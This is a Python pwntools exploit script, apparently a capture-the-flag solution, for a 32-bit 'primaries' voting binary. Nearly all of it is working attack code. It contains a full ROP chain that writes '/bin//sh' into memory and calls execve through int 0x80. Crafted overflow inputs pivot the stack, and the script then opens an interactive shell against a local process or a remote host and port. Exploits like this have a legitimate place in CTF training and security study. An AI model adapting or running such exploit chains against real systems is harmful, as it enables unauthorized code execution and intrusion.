#!/usr/bin/env python

from pwn import *
import sys

'''
typedef struct {
	char name[0x100]
	int a;
	int b;
	func* win;
} primaries;

typedef struct {
	char* name[0x100];
	unsigned long SSN;
	char* vote_candidate;
	char* DOB[0x100];
}

'''

p = ''
p += p32(0x0806f4fa) # pop edx ; ret
p += p32(0x080eb060) # @ .data
p += p32(0x080bb926) # pop eax ; ret
p += '/bin'
p += p32(0x08097936) # mov dword ptr [edx], eax ; pop ebx ; ret
p += p32(0x41414141) # padding
p += p32(0x0806f4fa) # pop edx ; ret
p += p32(0x080eb064) # @ .data + 4
p += p32(0x080bb926) # pop eax ; ret
p += '//sh'
p += p32(0x08097936) # mov dword ptr [edx], eax ; pop ebx ; ret
p += p32(0x41414141) # padding
p += p32(0x0806f4fa) # pop edx ; ret
p += p32(0x080eb068) # @ .data + 8
p += p32(0x08054f20) # xor eax, eax ; ret
p += p32(0x08097936) # mov dword ptr [edx], eax ; pop ebx ; ret
p += p32(0x41414141) # padding
p += p32(0x080481c9) # pop ebx ; ret
p += p32(0x080eb060) # @ .data
p += p32(0x0806f521) # pop ecx ; pop ebx ; ret
p += p32(0x080eb068) # @ .data + 8
p += p32(0x080eb060) # padding without overwrite ebx
p += p32(0x0806f4fa) # pop edx ; ret
p += p32(0x080eb068) # @ .data + 8
p += p32(0x08054f20) # xor eax, eax ; ret
p += p32(0x0807bf4f) # inc eax ; ret
p += p32(0x0807bf4f) # inc eax ; ret
p += p32(0x0807bf4f) # inc eax ; ret
p += p32(0x0807bf4f) # inc eax ; ret
p += p32(0x0807bf4f) # inc eax ; ret
p += p32(0x0807bf4f) # inc eax ; ret
p += p32(0x0807bf4f) # inc eax ; ret
p += p32(0x0807bf4f) # inc eax ; ret
p += p32(0x0807bf4f) # inc eax ; ret
p += p32(0x0807bf4f) # inc eax ; ret
p += p32(0x0807bf4f) # inc eax ; ret
p += p32(0x08049b81) # int 0x80

def vote(name, ssn, dob, choice, candidate, ):
	r.recvuntil("Please enter your full name:")
	r.sendline(name)
	r.recvuntil("Please enter your SSN:")
	r.sendline(str(ssn))
	r.recvuntil("Please enter your date of birth:")
	r.sendline(dob)
	r.recvuntil("candidate you are voting for:", timeout=1)
	r.sendline(str(choice))
	r.recvuntil("Who do you want to vote for?", timeout=1)
	r.sendline(candidate)

def exploit(r):

	name = 'uafio'
	ssn = 123
	dob = 'today'
	choice = 4
	candidate  = p32(0x80eb00c)
	candidate += "X" * 8
	candidate += p32(0x80EB000)
	candidate += "Z" * 48
	candidate += "B" * 64
	candidate += "C" * 128
	candidate += p32(0x8048F62)

	for i in range(100):
		vote(name, ssn, dob, choice, candidate)

	name = 'AAAABBBBCCCCDDDDEEEEFFFFGGGG'
	name += p32(0x080bbc36)		# 0x080bbc36: mov esp, ecx ; ret
	ssn = 123
	dob = 't'
	dob += p
	choice = 4
	candidate  = p32(0x80eb00c)
	candidate += "B" * 60
	candidate += "B" * 64
	candidate += "C" * 128
	candidate += p32(0x8048F62)

	for i in range(1):
		vote(name, ssn, dob, choice, candidate)


	r.interactive()


if __name__ == "__main__":
    log.info("For remote: %s HOST PORT" % sys.argv[0])
    if len(sys.argv) > 1:
        r = remote(sys.argv[1], int(sys.argv[2]))
        exploit(r)
    else:
        r = process(['/vagrant/voting.pwn/pwn150/primaries'])
        print util.proc.pidof(r)
        pause()
        exploit(r)